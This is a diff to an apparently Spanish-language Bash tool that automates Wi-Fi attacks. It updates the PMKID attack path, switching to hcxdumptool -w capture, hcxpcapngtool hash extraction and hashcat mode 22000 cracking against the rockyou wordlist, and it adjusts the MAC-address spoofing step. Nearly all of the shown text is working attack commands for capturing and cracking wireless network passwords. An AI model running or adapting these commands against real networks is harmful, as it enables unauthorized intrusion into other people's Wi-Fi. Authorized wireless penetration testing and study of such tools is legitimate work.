@@ -1,7 +1,3 @@
-#!/bin/bash
-
-# Author: s4vitar - nmap y pa' dentro
-
 #Colours
 greenColour="\e[0;32m\033[1m"
 endColour="\033[0m\e[0m"
@@ -59,7 +55,7 @@ function startAttack(){
 		clear
 		echo -e "${yellowColour}[*]${endColour}${grayColour} Configurando tarjeta de red...${endColour}\n"
 		airmon-ng start $networkCard > /dev/null 2>&1
-		ifconfig ${networkCard}mon down && macchanger -a ${networkCard}mon > /dev/null 2>&1
+		ifconfig ${networkCard}mon down && macchanger -a ${networkCard} > /dev/null 2>&1
 		ifconfig ${networkCard}mon up; killall dhclient wpa_supplicant 2>/dev/null
 
 		echo -e "${yellowColour}[*]${endColour}${grayColour} Nueva dirección MAC asignada ${endColour}${purpleColour}[${endColour}${blueColour}$(macchanger -s ${networkCard}mon | grep -i current | xargs | cut -d ' ' -f '3-100')${endColour}${purpleColour}]${endColour}"
@@ -88,10 +84,11 @@ function startAttack(){
 	elif [ "$(echo $attack_mode)" == "PKMID" ]; then
 		clear; echo -e "${yellowColour}[*]${endColour}${grayColour} Iniciando ClientLess PKMID Attack...${endColour}\n"
 		sleep 2
-		timeout 60 bash -c "hcxdumptool -i ${networkCard}mon --enable_status=1 -o Captura"
+		timeout 60 bash -c "hcxdumptool -i ${networkCard}mon -w Captura"
 		echo -e "\n\n${yellowColour}[*]${endColour}${grayColour} Obteniendo Hashes...${endColour}\n"
 		sleep 2
-		hcxpcaptool -z myHashes Captura; rm Captura 2>/dev/null
+		#hcxpcaptool -z myHashes Captura; rm Captura 2>/dev/null
+                hcxpcapngtool --log=myHashes.log -o myHashes Captura
 
 		test -f myHashes
 
@@ -99,7 +96,7 @@ function startAttack(){
 			echo -e "\n${yellowColour}[*]${endColour}${grayColour} Iniciando proceso de fuerza bruta...${endColour}\n"
 			sleep 2
 
-			hashcat -m 16800 /usr/share/wordlists/rockyou.txt myHashes -d 1 --force
+			hashcat -m 22000 myHashes /usr/share/wordlists/rockyou.txt -d 1 --force
 		else
 			echo -e "\n${redColour}[!]${endColour}${grayColour} No se ha podido capturar el paquete necesario...${endColour}\n"
 			rm Captura* 2>/dev/null
